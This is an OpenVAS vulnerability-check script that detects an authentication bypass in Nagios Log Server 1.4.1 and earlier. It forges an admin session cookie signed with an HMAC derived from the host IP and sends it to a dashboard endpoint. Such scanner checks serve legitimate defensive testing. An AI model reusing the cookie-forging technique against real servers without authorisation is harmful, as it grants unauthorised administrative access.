###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nagiosls_mul_vul_oct_16.nasl 13659 2019-02-14 08:34:21Z cfischer $#
# Nagios Log Server Multiple Vulnerabilities
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:nagios:nagiosls";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107059");
  script_version("$Revision: 13659 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-10-12 13:26:09 +0700 (Wed, 12 Oct 2016)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Nagios Log Server Multiple Vulnerabilities");

  script_category(ACT_GATHER_INFO);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_nagios_log_serv_detect.nasl");
  script_mandatory_keys("nagiosls/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Nagios Log Server is prone to multiple vulnerabilities, including authentication
  bypass, stored cross site scripting, inconsistent authorization controls and privilege escalation vulnerability.");

  script_tag(name:"affected", value:"Nagios Log Server 1.4.1 and before.");

  script_tag(name:"solution", value:"Upgrade to version 1.4.2.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Aug/56");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");
include("version_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:TRUE ) ) exit( 0 );

appVer = infos['version'];
if( ! dir = infos['location'] ) exit( 0 );
if( dir == "/" ) dir = "";

host = get_host_ip();
source_ip = this_host();
usr_agnt = http_get_user_agent();
session = string('a:12:{s:10:"session_id";s:32:"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";s:10:"ip_address";s:',strlen(source_ip),':', source_ip, ';s:10:"user_agent";s:', strlen(usr_agnt), ':', usr_agnt,';s:13:"last_activity";i:1476194170;s:9:"user_data";s:0:"";s:7:"user_id";s:1:"1";s:8:"username";s:4:"XXXX";s:5:"email";s:16:"test@example.com";s:12:"ls_logged_in";i:1;s:10:"apisession";i:1;s:8:"language";s:7:"default";s:17:"flash:old:message";N;}');

encryption_key = SHA1(host);
hmac_check = HMAC_SHA1(data: session, key: hexstr(encryption_key));
cookie = string (session, hexstr(hmac_check));
cookie2 = urlencode(str:cookie);

url = dir + "/index.php/dashboard/dashlet";

req = http_post_req( port: port,
                     url: url,
                     accept_header:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                     add_headers: make_array("Cookie", cookie2,
                                             "Content-Type", "application/x-www-form-urlencoded") );
res = http_keepalive_send_recv(port:port, data:req);

if ((res =~ "^HTTP/1\.[01] 200") && (version_is_less_equal(version: appVer, test_version:"1.4.1"))) {
   report = report_vuln_url( port:port, url:url ) + '\n\n';
   report += "It might be possible to bypass the authentication using the session cookie: " + cookie + '\n';
   security_message(port: port, data: report);
   exit(0);
}

exit(99);
